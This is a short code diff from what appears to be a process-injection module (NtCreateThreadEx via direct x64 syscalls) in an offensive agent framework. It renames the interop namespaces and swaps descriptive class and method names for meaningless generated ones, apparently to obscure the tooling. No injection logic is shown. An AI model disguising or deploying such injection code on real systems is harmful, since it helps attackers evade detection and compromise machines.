@@ -1,12 +1,12 @@
 ﻿using System;
 using System.Runtime.InteropServices;
-using ApolloInterop.Classes.Core;
-using ApolloInterop.Interfaces;
+using PhantomInterop.Classes.Core;
+using PhantomInterop.Interfaces;
 using Injection.Shared;
 
 namespace Injection.Techniques.Syscall_x64
 {
-    public class NtCreateThreadEx : InjectionTechnique
+    public class IntelligentProcessor3E1D : InjectionTechnique
     {
         private USysCall64 _syscall;
 
@@ -113,7 +113,7 @@ namespace Injection.Techniques.Syscall_x64
             }
         }
 
-        private void Setup(IAgent agent)
+        private void CipherManagerC83F(IAgent agent)
         {
             if (IntPtr.Size != 8)
             {
